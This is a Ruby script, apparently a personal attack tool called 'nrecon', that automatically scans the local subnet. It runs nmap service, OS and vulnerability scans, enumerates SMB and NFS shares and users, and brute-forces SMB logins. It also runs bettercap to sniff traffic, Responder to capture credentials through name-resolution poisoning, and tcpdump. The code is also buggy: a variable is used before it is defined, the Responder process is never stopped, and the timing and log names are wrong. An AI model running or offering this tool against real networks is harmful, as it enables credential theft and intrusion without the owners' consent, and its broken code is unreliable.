#!/usr/bin/env ruby
require 'colorize'
require 'time'

puts <<-'EOF'

<-. (`-')_    (`-')  (`-')  _                     <-. (`-')_ 
   \( OO) )<-.(OO )  ( OO).-/ _             .->      \( OO) )
,--./ ,--/ ,------,)(,------. \-,-----.(`-')----. ,--./ ,--/ 
|   \ |  | |   /`. ' |  .---'  |  .--./( OO).-.  '|   \ |  | 
|  . '|  |)|  |_.' |(|  '--.  /_) (`-')( _) | |  ||  . '|  |)
|  |\    | |  .   .' |  .--'  ||  |OO ) \|  |)|  ||  |\    | 
|  | \   | |  |\  \  |  `---.(_'  '--'\  '  '-'  '|  | \   | 
`--'  `--' `--' '--' `------'   `-----'   `-----' `--'  `--''

--[ 👀 Network Reconnissance ]--------

+ Nmap scans, SMB enumeration, Responder, packet capturing, vuln scanning

EOF

# Arguments
if ARGV.include?('-h') || ARGV.empty?
  puts <<-'EOF'

  ---------------------------------------------------------
  USSAGE: nrec.rb [FLAGS] [TARGET]
   
   FLAGS

     -nb  Disable SMB Brute Force.
     -nv  Disable nmap vulscan.
     -nf  Disable full nmap scan.
     -c   Clean logs.
     -cq  Clean logs & quit.

    TARGET
      a target name, usually ssid to store log files
  
  ---------------------------------------------------------

  EOF
  exit
end

puts 'Cleaning logs... '.green if ARGV.include?('-c') || ARGV.include?('-cq')
`rm #{ log }/*` if ARGV.include?('-c')
`rm #{ log }/*` && exit if ARGV.include?('-cq')

puts "OPTIONS: ".green
puts '- Disable SMB Brute Force'.blue if ARGV.include?('-nb')
puts '- Disable nmap vulscan'.blue if ARGV.include?('-nv')
puts '- Disable full nmap scan.'.blue if ARGV.include?('-nf')


# Configuration
minitues_until_quit = 60
timestamp = DateTime.now
iface = 'wlan0'
target = ARGV.last
log = '/root/git/nrecon/log/' + target
`mkdir -p #{ log }`


# Get IP and subnet to attack
puts "+====================================================".light_cyan
puts "| Network identification...".light_cyan
ip_cmd = "ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\\2/p'"
ip = `#{ip_cmd}`.delete('^0-9.').split('.')
puts "|  - Current IP address is #{ ip.join('.') }".green
# range = [ip[0], ip[1], ip[2], '0/24'].join('.')
range = [ip[0], ip[1], ip[2], '1-254'].join('.')
puts "=[ ✔ DONE ]==========================================".light_cyan

# Find local hosts
puts "+====================================================".light_cyan
puts "| Finding hosts...                         ".light_cyan
`nmap -sn #{ range } -oG #{ log }/nhosts-#{ timestamp }`
hosts = IO.readlines("#{ log }/nhosts-#{ timestamp }").map {|l| l.split(" ")[1].delete('Nmap') }.reject(&:empty?)
hosts.reject! { |h| h.include?("#{ ip.join('.') }") }
IO.write("#{ log }/hosts-#{ timestamp }", hosts.join("\n"))
puts "| Hosts:                                   ".light_cyan
hosts.each { |h| puts "|  🎯 #{ h } ✔".green }
puts "|=[ ✔ DONE ]=========================================".light_cyan

# Nmap quick scan
puts "+====================================================".light_cyan
puts "| Starting nmap scans...".light_cyan
# nscan = `nmap -p 1-65535 -sV --version-intensity 5 -A -O -sS -oN #{ log }/nscan-#{ timestamp }.txt -iL #{ log }/hosts-#{ timestamp }`
nscan = `nmap -sV --version-intensity 5 -A -O -oN #{ log }/nscan-#{ timestamp }.txt -iL #{ log }/hosts-#{ timestamp }`
puts "|  - Saved to #{ log }/nscan-#{ timestamp }.txt".green

# SMB Shares
puts "| Finding SMB shares...".light_cyan
`nmap -Pn -T4 --script smb-enum-shares -p445 -oN #{ log }/smbshares-#{ timestamp }.txt -iL #{ log }/hosts-#{ timestamp }`
puts "|  - Saved to #{ log }/smbshares-#{ timestamp }.txt".green
puts "+====================================================".light_cyan

# SMB Brute login
unless ARGV.include?('-nb')
  puts "| Brute forcing SMB shares...".light_cyan
  `nmap -sV -T4 --script smb-brute -p445 -oN #{ log }/smbbrute-#{ timestamp }.txt -iL #{ log }/hosts-#{ timestamp }`
puts "|  - Saved to #{ log }/smbbrute-#{ timestamp }.txt".green
end

# SMB Users
puts "| Finding SMB users...".light_cyan
`nmap -Pn -T4 -sU -sS --script smb-enum-users -p U:137,T:139 -oN #{ log }/smbusers-#{ timestamp }.txt -iL #{ log }/hosts-#{ timestamp }`
puts "|  - Saved to #{ log }/smbusers-#{ timestamp }.txt".green

# NFS Shares
puts "| Finding NFS shares...".light_cyan
`nmap -Pn -sV -T4 --script afp-showmount -p111 -oN #{ log }/nfs-#{ timestamp }.txt -iL #{ log }/hosts-#{ timestamp }`
puts "|  - Saved to #{ log }/nfs-#{ timestamp }.txt".green
puts "|=[ ✔ DONE ]=========================================".light_cyan

# Nmap Vulnerability scanner
unless ARGV.include?('-nv')
  puts "+====================================================".light_cyan
  puts "| Nmap Vulnerability scanner...".light_cyan
  `nmap -sV --script=vulscan/vulscan.nse -oN #{ log }/vuln-#{ timestamp }.txt -iL #{ log }/hosts-#{ timestamp }`
  puts "|  - Saved to #{ log }/smbusers-#{ timestamp }.txt".green
end


# Bettercap sniffing
puts "+====================================================".light_cyan
puts "| Sniffing web traffic...".light_cyan
becap_proc = IO.popen("bettercap -I #{ iface } -XL -O #{ log }/bcap-#{ timestamp }", 'w')
bcap_pid = becap_proc.pid

# Responder
puts "+====================================================".light_cyan
puts "| Starting Responder...".light_cyan
resp_proc = IO.popen("responder -I #{ iface } > #{ log }/responder-#{ timestamp }", 'w')
resp_pid = resp_proc.pid

# TCPdump
puts "+====================================================".light_cyan
puts "| Starting tcpdump...".light_cyan
resp_proc = IO.popen("tcpdump -i #{ iface } -w #{ log }/tcpdump-#{ timestamp }", 'w')
resp_pid = resp_proc.pid

# Full scan
unless ARGV.include?('-nf')
  puts "| Starting full nmap scan...".light_cyan
  `nmap -sU -T4 -oN #{ log }/full-#{ timestamp }.txt -iL #{ log }/hosts-#{ timestamp }`
  puts "|  - Saved to #{ log }/full-#{ timestamp }.txt".green
end

# Kill processes
sleep 10 * minitues_until_quit
puts "killing bettercap."
Process.kill("INT", bcap_pid)
puts "killing Responder."
Process.kill("INT", resp_pid)
puts "killing tcpdump."
Process.kill("INT", resp_pid)
puts " ✔ NETWORK RECONNISSANCE COMPLETE!".green
